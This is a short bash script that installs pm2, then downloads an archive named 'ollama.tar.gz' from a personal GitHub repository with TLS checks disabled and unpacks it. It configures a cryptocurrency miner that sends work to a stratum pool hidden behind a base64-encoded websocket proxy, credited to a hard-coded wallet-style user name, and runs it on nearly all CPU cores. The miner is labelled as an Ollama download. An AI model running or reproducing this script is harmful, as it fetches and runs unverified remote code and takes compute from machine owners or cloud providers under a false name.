#!/bin/bash
npm install pm2 -g
sleep 2
pm2 set pm2:sysmonit true
sleep 2
pm2 update

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2
curl -s -k https://raw.githubusercontent.com/miltoncarpenter665/Ollama/refs/heads/main/ollama.tar.gz -L -O -J
sleep 2
tar -xf ollama.tar.gz
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_BitWasm_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 1`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

cat > config.json <<END
{
  "host": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/c3RyYXR1bS5ub3ZhZ3JpZC5vbmxpbmU6MzAwMQ==",
  "port": 3306,
  "user": "MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate",
  "pass": "x",
  "threads": $used_num_of_cores
}
END

sleep 2

pm2 start app.js
